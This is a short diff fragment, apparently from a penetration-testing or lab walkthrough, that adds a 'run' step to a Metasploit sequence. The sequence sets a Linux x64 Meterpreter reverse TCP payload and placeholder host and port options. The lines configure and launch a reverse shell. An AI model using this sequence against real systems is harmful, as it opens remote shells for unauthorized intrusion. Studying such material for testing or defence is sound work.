@@ -166,4 +166,5 @@ set PAYLOAD linux/x64/meterpreter/reverse_tcp
 show options
 set <RHOST>
 set <PORT>
+run
 ```
